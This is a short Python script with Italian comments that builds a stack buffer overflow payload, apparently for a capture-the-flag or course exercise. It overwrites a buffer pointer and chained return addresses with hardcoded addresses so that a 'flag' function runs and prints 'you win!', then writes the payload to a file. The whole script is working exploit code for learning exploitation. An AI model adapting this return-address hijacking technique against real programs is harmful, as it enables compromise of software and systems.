import os
import struct

#stampare la stringa "you win!" sempre sfruttando la vulnerabilita` definita all'interno della funzione vuln (get_input->vuln->flag)

flagvalue = 0x0804a128
flag_fun = 0x80484ce

vuln = 0x804846b
string = 0x0804a060 

#payload = deadfeef + 128 + indirizzo flagvalue + \n

payload = struct.pack("I", 0xdeadfeef)
payload += "a"*(128 - len(payload))
payload += struct.pack("I", flagvalue)
payload += "\n" #perche` dopo lo unisco all'altra parte del payload ma devo segnalare

#payload1 per la seconda gets che pero` si somma all'altro
payload1 = "a"*148 #base per arrivare a *buf --> sono "a" per matchare la condizione dentro vuln
payload1 += struct.pack("I", string) #metto dentro a buf l'indirizzo della funz globale string
payload1 += "C"*8
payload1 += struct.pack("I", vuln) #nel ret address di get_input metto vuln
payload1 += "D"*4 #padding per il ret address di vuln
#nel ret address metto l'indirizzo di flag per farla eseguire
payload1 += struct.pack("I", flag_fun)

payload += payload1

f = open("badfile", "w")
f.write("%s" % payload)
f.close()


